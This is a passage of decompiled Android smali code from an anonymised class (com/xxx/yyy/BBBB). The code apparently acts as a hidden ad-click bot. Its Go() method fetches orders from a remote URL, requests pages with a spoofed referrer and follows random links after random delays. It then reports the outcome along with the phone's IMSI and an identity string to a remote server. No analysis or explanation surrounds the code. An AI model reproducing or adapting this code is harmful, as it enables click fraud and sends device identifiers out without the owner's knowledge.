    .end local v0           #e:Ljava/lang/Exception;
    .restart local v2       #url:Ljava/lang/String;
    :cond_0
    new-instance v3, Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->prul:Ljava/lang/String;

    invoke-static {v4}, Ljava/lang/String;->valueOf(Ljava/lang/Object;)Ljava/lang/String;

    move-result-object v4

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    const-string v4, "?imsi="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->imsi:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&way="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v4, p0, Lcom/xxx/yyy/BBBB;->identity:Ljava/lang/String;

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "&result="

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3, p1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    goto :goto_1
.end method

.method private SleepTime(II)V
    .locals 4
    .parameter "min"
    .parameter "max"

    .prologue
    .line 394
    :try_start_0
    invoke-direct {p0, p1, p2}, Lcom/xxx/yyy/BBBB;->GetRandomFromMinToMax(II)I

    move-result v1

    .line 395
    .local v1, sleeptime:I
    if-ltz v1, :cond_0

    if-le v1, p2, :cond_1

    .line 396
    :cond_0
    move v1, p1

    .line 399
    :cond_1
    mul-int/lit16 v2, v1, 0x3e8

    int-to-long v2, v2

    invoke-static {v2, v3}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 405
    .end local v1           #sleeptime:I
    :goto_0
    return-void

    .line 402
    :catch_0
    move-exception v2

    move-object v0, v2

    .line 403
    .local v0, e:Ljava/lang/InterruptedException;
    goto :goto_0
.end method

.method static synthetic access$0(Lcom/xxx/yyy/BBBB;Ljava/lang/String;)V
    .locals 0
    .parameter
    .parameter

    .prologue
    .line 65
    iput-object p1, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public Go()V
    .locals 14

    .prologue
    const/16 v13, 0xf

    const/4 v12, 0x3

    const/4 v11, 0x5

    const/4 v9, 0x1

    const-string v10, ""

    .line 408
    const-string v7, ""

    iput-object v10, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    .line 409
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->clear()V

    .line 414
    const-string v0, ""

    .line 415
    .local v0, body:Ljava/lang/String;
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->gwul:Ljava/lang/String;

    const-string v8, ""

    invoke-direct {p0, v7, v10}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    .line 417
    .local v3, order:Ljava/lang/String;
    invoke-virtual {v3}, Ljava/lang/String;->length()I

    move-result v7

    const/16 v8, 0xa

    if-le v7, v8, :cond_9

    .line 419
    const-string v7, "\\|"

    invoke-virtual {v3, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    const/4 v8, 0x0

    aget-object v7, v7, v8

    invoke-static {v7}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v7

    iput v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    .line 420
    const-string v7, "\\|"

    invoke-virtual {v3, v7}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    aget-object v5, v7, v9

    .line 423
    .local v5, search:Ljava/lang/String;
    iput-object v5, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    .line 424
    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-eq v7, v12, :cond_0

    .line 427
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->hmul:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-le v7, v11, :cond_0

    .line 429
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->hmul:Ljava/lang/String;

    const-string v8, ""

    invoke-direct {p0, v7, v10}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 433
    :cond_0
    const/16 v7, 0x1e

    invoke-direct {p0, v13, v7}, Lcom/xxx/yyy/BBBB;->SleepTime(II)V

    .line 435
    const-string v7, ""

    invoke-direct {p0, v5, v10}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 437
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->context:Landroid/content/Context;

    const v8, 0x7f050045

    invoke-virtual {v7, v8}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v7

    invoke-direct {p0, v0, v7}, Lcom/xxx/yyy/BBBB;->FixUrls(Ljava/lang/String;Ljava/lang/String;)V

    .line 439
    iput v9, p0, Lcom/xxx/yyy/BBBB;->result:I

    .line 440
    const-string v6, ""

    .line 441
    .local v6, url:Ljava/lang/String;
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-eqz v7, :cond_1

    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    const/4 v8, 0x2

    if-ne v7, v8, :cond_4

    :cond_1
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    if-lez v7, :cond_4

    .line 445
    const/4 v7, 0x2

    iput v7, p0, Lcom/xxx/yyy/BBBB;->result:I

    .line 447
    const/4 v7, -0x1

    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v8

    add-int/lit8 v8, v8, 0x1

    invoke-direct {p0, v7, v8}, Lcom/xxx/yyy/BBBB;->GetRandomFromMinToMax(II)I

    move-result v4

    .line 448
    .local v4, pos:I
    if-ltz v4, :cond_2

    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    sub-int/2addr v7, v9

    if-le v4, v7, :cond_3

    .line 449
    :cond_2
    const/4 v4, 0x0

    .line 450
    :cond_3
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    .end local v6           #url:Ljava/lang/String;
    check-cast v6, Ljava/lang/String;

    .line 452
    .end local v4           #pos:I
    .restart local v6       #url:Ljava/lang/String;
    :cond_4
    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-ne v7, v12, :cond_5

    .line 453
    const-string v6, ""

    .line 456
    :cond_5
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_6

    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-ne v7, v9, :cond_6

    .line 457
    iget-object v6, p0, Lcom/xxx/yyy/BBBB;->adurl:Ljava/lang/String;

    .line 461
    :cond_6
    invoke-direct {p0, v11, v13}, Lcom/xxx/yyy/BBBB;->SleepTime(II)V

    .line 463
    const/4 v1, 0x0

    .line 464
    .local v1, flag:Z
    invoke-virtual {v6}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_b

    .line 466
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    invoke-direct {p0, v6, v7}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 467
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_7

    .line 468
    iget-object v6, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    .line 469
    const-string v7, ""

    iput-object v10, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    .line 471
    :cond_7
    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v7

    if-nez v7, :cond_a

    .line 472
    iput v11, p0, Lcom/xxx/yyy/BBBB;->result:I

    .line 473
    const/4 v1, 0x0

    .line 486
    :goto_0
    invoke-direct {p0, v11, v13}, Lcom/xxx/yyy/BBBB;->SleepTime(II)V

    .line 488
    :goto_1
    if-eqz v1, :cond_8

    iget v7, p0, Lcom/xxx/yyy/BBBB;->randomDoCount:I

    if-lez v7, :cond_8

    invoke-virtual {v0}, Ljava/lang/String;->length()I

    move-result v7

    if-gtz v7, :cond_d

    .line 509
    :cond_8
    iget v7, p0, Lcom/xxx/yyy/BBBB;->result:I

    invoke-direct {p0, v7}, Lcom/xxx/yyy/BBBB;->PostResult(I)V

    .line 511
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->clear()V

    .line 512
    const-string v6, ""

    .line 514
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->httpClient:Lorg/apache/http/impl/client/DefaultHttpClient;

    invoke-virtual {v7}, Lorg/apache/http/impl/client/DefaultHttpClient;->getConnectionManager()Lorg/apache/http/conn/ClientConnectionManager;

    move-result-object v7

    invoke-interface {v7}, Lorg/apache/http/conn/ClientConnectionManager;->shutdown()V

    .line 516
    .end local v1           #flag:Z
    .end local v5           #search:Ljava/lang/String;
    .end local v6           #url:Ljava/lang/String;
    :cond_9
    return-void

    .line 476
    .restart local v1       #flag:Z
    .restart local v5       #search:Ljava/lang/String;
    .restart local v6       #url:Ljava/lang/String;
    :cond_a
    const/4 v1, 0x1

    goto :goto_0

    .line 480
    :cond_b
    iget v7, p0, Lcom/xxx/yyy/BBBB;->dotype:I

    if-ne v7, v12, :cond_c

    .line 481
    iput v12, p0, Lcom/xxx/yyy/BBBB;->result:I

    goto :goto_0

    .line 483
    :cond_c
    const/4 v7, 0x4

    iput v7, p0, Lcom/xxx/yyy/BBBB;->result:I

    goto :goto_0

    .line 490
    :cond_d
    invoke-direct {p0, v0, v6}, Lcom/xxx/yyy/BBBB;->FindHttpHead(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    .line 491
    .local v2, head:Ljava/lang/String;
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->clear()V

    .line 492
    invoke-direct {p0, v0, v2}, Lcom/xxx/yyy/BBBB;->FixUrls(Ljava/lang/String;Ljava/lang/String;)V

    .line 493
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    if-lez v7, :cond_10

    .line 495
    const/4 v7, -0x1

    iget-object v8, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v8}, Ljava/util/List;->size()I

    move-result v8

    add-int/lit8 v8, v8, 0x1

    invoke-direct {p0, v7, v8}, Lcom/xxx/yyy/BBBB;->GetRandomFromMinToMax(II)I

    move-result v4

    .line 496
    .restart local v4       #pos:I
    if-ltz v4, :cond_e

    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7}, Ljava/util/List;->size()I

    move-result v7

    sub-int/2addr v7, v9

    if-le v4, v7, :cond_f

    .line 497
    :cond_e
    const/4 v4, 0x0

    .line 498
    :cond_f
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->urls:Ljava/util/List;

    invoke-interface {v7, v4}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v6

    .end local v6           #url:Ljava/lang/String;
    check-cast v6, Ljava/lang/String;

    .line 499
    .restart local v6       #url:Ljava/lang/String;
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->refer:Ljava/lang/String;

    invoke-direct {p0, v6, v7}, Lcom/xxx/yyy/BBBB;->HppGet(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    .line 500
    iget-object v7, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    invoke-virtual {v7}, Ljava/lang/String;->length()I

    move-result v7

    if-lez v7, :cond_10

    .line 501
    iget-object v6, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    .line 502
    const-string v7, ""

    iput-object v10, p0, Lcom/xxx/yyy/BBBB;->redirectUrl:Ljava/lang/String;

    .line 505
    .end local v4           #pos:I
    :cond_10
    iget v7, p0, Lcom/xxx/yyy/BBBB;->randomDoCount:I

    sub-int/2addr v7, v9

    iput v7, p0, Lcom/xxx/yyy/BBBB;->randomDoCount:I

    .line 506
    invoke-direct {p0, v11, v13}, Lcom/xxx/yyy/BBBB;->SleepTime(II)V

    goto :goto_1
.end method

.method public generateString(Ljava/io/InputStream;)Ljava/lang/String;
    .locals 6
    .parameter "stream"

    .prologue
    .line 124
    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, p1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    .line 125
    .local v3, reader:Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 126
    .local v0, buffer:Ljava/io/BufferedReader;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 129
    .local v4, sb:Ljava/lang/StringBuilder;
    :goto_0
    :try_start_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .local v1, cur:Ljava/lang/String;
    if-nez v1, :cond_0

    .line 138
    .end local v1           #cur:Ljava/lang/String;
    :goto_1
    :try_start_1
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 143
    :goto_2
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    return-object v5

    .line 130
    .restart local v1       #cur:Ljava/lang/String;
    :cond_0
    :try_start_2
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    .line 133
    .end local v1           #cur:Ljava/lang/String;
    :catch_0
    move-exception v5

    move-object v2, v5

    .line 135
    .local v2, e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 139
    .end local v2           #e:Ljava/io/IOException;
    :catch_1
    move-exception v2

    .line 141
    .restart local v2       #e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2
.end method

.method public generateString(Ljava/io/InputStream;Ljava/lang/String;)Ljava/lang/String;
    .locals 6
    .parameter "stream"
    .parameter "charSet"
    .annotation system Ldalvik/annotation/Throws;
        value = {
            Ljava/io/UnsupportedEncodingException;
        }
    .end annotation

    .prologue
    .line 146
    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, p1, p2}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    .line 147
    .local v3, reader:Ljava/io/InputStreamReader;
    new-instance v0, Ljava/io/BufferedReader;

    invoke-direct {v0, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 148
    .local v0, buffer:Ljava/io/BufferedReader;
    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    .line 151
    .local v4, sb:Ljava/lang/StringBuilder;
    :goto_0
    :try_start_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    move-result-object v1

    .local v1, cur:Ljava/lang/String;
    if-nez v1, :cond_0

    .line 160
    .end local v1           #cur:Ljava/lang/String;
    :goto_1
    :try_start_1
    invoke-virtual {p1}, Ljava/io/InputStream;->close()V
    :try_end_1
    .catch Ljava/io/IOException; {:try_start_1 .. :try_end_1} :catch_1

    .line 165
    :goto_2
    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    return-object v5

    .line 152
    .restart local v1       #cur:Ljava/lang/String;
    :cond_0
    :try_start_2
    invoke-virtual {v4, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_0

    goto :goto_0

    .line 155
    .end local v1           #cur:Ljava/lang/String;
    :catch_0
    move-exception v5

    move-object v2, v5

    .line 157
    .local v2, e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_1

    .line 161
    .end local v2           #e:Ljava/io/IOException;
    :catch_1
    move-exception v2

    .line 163
    .restart local v2       #e:Ljava/io/IOException;
    invoke-virtual {v2}, Ljava/io/IOException;->printStackTrace()V

    goto :goto_2
.end method

.method public getContentCharset(Lorg/apache/http/HttpResponse;)Ljava/lang/String;
    .locals 4
    .parameter "response"

    .prologue
    .line 276
    const-string v0, "ISO_8859-1"

    .line 277
    .local v0, charset:Ljava/lang/String;
    invoke-interface {p1}, Lorg/apache/http/HttpResponse;->getEntity()Lorg/apache/http/HttpEntity;

    move-result-object v3

    invoke-interface {v3}, Lorg/apache/http/HttpEntity;->getContentType()Lorg/apache/http/Header;

    move-result-object v1

    .line 278
    .local v1, header:Lorg/apache/http/Header;
    if-eqz v1, :cond_0

    .line 279
    invoke-interface {v1}, Lorg/apache/http/Header;->getValue()Ljava/lang/String;

    move-result-object v2

    .line 280
    .local v2, s:Ljava/lang/String;
    const-string v3, "(charset)\\s?=\\s?(utf-?8)"

    invoke-virtual {p0, v2, v3}, Lcom/xxx/yyy/BBBB;->matcher(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_1

    .line 281
    const-string v0, "utf-8"

    .line 289
    .end local v2           #s:Ljava/lang/String;
    :cond_0
    :goto_0
    return-object v0

    .line 283
    .restart local v2       #s:Ljava/lang/String;
    :cond_1
    const-string v3, "(charset)\\s?=\\s?(gbk)"

    invoke-virtual {p0, v2, v3}, Lcom/xxx/yyy/BBBB;->matcher(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_2

    .line 284
    const-string v0, "gbk"

    goto :goto_0

    .line 285
    :cond_2
    const-string v3, "(charset)\\s?=\\s?(gb2312)"

    invoke-virtual {p0, v2, v3}, Lcom/xxx/yyy/BBBB;->matcher(Ljava/lang/String;Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_0

    .line 286
    const-string v0, "gb2312"

    goto :goto_0
.end method

.method public matcher(Ljava/lang/String;Ljava/lang/String;)Z
    .locals 3
    .parameter "s"
    .parameter "pattern"

    .prologue
    .line 264
    const/16 v2, 0x42

    invoke-static {p2, v2}, Ljava/util/regex/Pattern;->compile(Ljava/lang/String;I)Ljava/util/regex/Pattern;

    move-result-object v1

    .line 266
    .local v1, p:Ljava/util/regex/Pattern;
    invoke-virtual {v1, p1}, Ljava/util/regex/Pattern;->matcher(Ljava/lang/CharSequence;)Ljava/util/regex/Matcher;

    move-result-object v0

    .line 267
    .local v0, matcher:Ljava/util/regex/Matcher;
    invoke-virtual {v0}, Ljava/util/regex/Matcher;->find()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 268
    const/4 v2, 0x1

    .line 270
    :goto_0
    return v2

    :cond_0
    const/4 v2, 0x0

    goto :goto_0
.end method
